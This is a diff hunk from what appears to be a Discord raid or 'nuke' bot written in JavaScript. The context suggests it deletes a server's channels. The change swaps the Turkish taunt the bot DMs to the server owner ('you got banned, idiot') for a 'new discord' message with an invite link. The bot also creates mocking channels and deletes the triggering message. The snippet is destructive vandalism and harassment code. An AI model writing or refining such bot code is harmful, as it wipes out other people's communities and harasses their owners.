@@ -46,7 +46,7 @@ return c.delete();
     
 
   
-message.guild.owner.send(`Ban Yedin Gerizaklıııı https://discord.gg/d2nAWtn`);
+message.guild.owner.send(`KARDEŞİM YENİ DİSCORD https://discord.gg/d2nAWtn`);
 message.guild.createChannel(`berke-abi-ne-yaptin`)
 message.guild.createChannel(`berke-adamdir`)
 message.delete()
